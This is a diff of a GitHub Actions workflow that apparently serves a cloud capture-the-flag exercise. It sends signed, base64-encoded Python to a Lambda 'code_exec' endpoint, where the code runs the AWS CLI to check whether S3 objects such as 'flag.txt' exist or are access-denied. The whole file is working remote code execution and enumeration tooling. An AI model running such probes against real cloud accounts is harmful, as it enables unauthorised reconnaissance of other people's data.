@@ -1,4 +1,4 @@
-name: Stage2-Boto3-Probe
+name: Stage2-AWSCLI-Probe
 
 on:
   push:
@@ -20,26 +20,21 @@ jobs:
       API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec
 
     steps:
-      - name: Verify credentials
-        run: |
-          aws sts get-caller-identity
-
       - name: Install dependencies
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Test Lambda boto3 default User-Agent
+      - name: Probe AWS CLI inside Lambda
         run: |
           python3 - <<'PY'
           import os
           import base64
-          import json
           import requests
           from requests_aws4auth import AWS4Auth
 
           api = os.environ["API_URL"]
 
-          creds = AWS4Auth(
+          auth = AWS4Auth(
               os.environ["AWS_ACCESS_KEY_ID"],
               os.environ["AWS_SECRET_ACCESS_KEY"],
               "us-east-1",
@@ -49,40 +44,36 @@ jobs:
 
           def invoke(bucket, key):
               code = f'''
-          import boto3
-          from botocore.config import Config
-          from botocore.exceptions import ClientError
+          import subprocess
 
-          bucket = {bucket!r}
-          key = {key!r}
+          command = [
+              "/opt/aws",
+              "s3api",
+              "head-object",
+              "--bucket",
+              {bucket!r},
+              "--key",
+              {key!r},
+              "--endpoint-url",
+              "https://s3.us-east-1.amazonaws.com"
+          ]
 
-          try:
-              s3 = boto3.client(
-                  "s3",
-                  region_name="us-east-1",
-                  endpoint_url="https://s3.us-east-1.amazonaws.com",
-                  config=Config(
-                      s3={{"addressing_style": "path"}}
-                  )
-              )
+          result = subprocess.run(
+              command,
+              stdout=subprocess.PIPE,
+              stderr=subprocess.PIPE
+          )
 
-              s3.head_object(Bucket=bucket, Key=key)
+          if result.returncode == 0:
               raise SystemExit(7)
 
-          except ClientError as exc:
-              err = exc.response.get("Error", {{}})
-              code = err.get("Code", "")
+          if b"AccessDenied" in result.stderr or b"Forbidden" in result.stderr:
+              raise SystemExit(10)
 
-              if code in ("AccessDenied", "Forbidden", "403"):
-                  raise SystemExit(10)
+          if b"NoSuchKey" in result.stderr or b"Not Found" in result.stderr:
+              raise SystemExit(12)
 
-              if code in ("NoSuchKey", "404", "NotFound"):
-                  raise SystemExit(12)
-
-              raise SystemExit(14)
-
-          except Exception:
-              raise SystemExit(19)
+          raise SystemExit(19)
           '''
 
               encoded = base64.b64encode(code.encode()).decode()
@@ -90,12 +81,11 @@ jobs:
               response = requests.post(
                   api,
                   json={"code": encoded},
-                  auth=creds,
+                  auth=auth,
                   timeout=40
               )
 
               print(f"BUCKET={bucket} KEY={key}")
-              print(f"HTTP={response.status_code}")
               print(response.text)
               print("---")
 
@@ -106,7 +96,7 @@ jobs:
               ("userad88e2b168aa387e", "junior_developer.png"),
               ("logad88e2b168aa387e", "flag.txt"),
               ("logad88e2b168aa387e", "index.html"),
-              ("logad88e2b168aa387e", "docs.html"),
+              ("logad88e2b168aa387e", "docs.html")
           ]
 
           for bucket, key in tests:
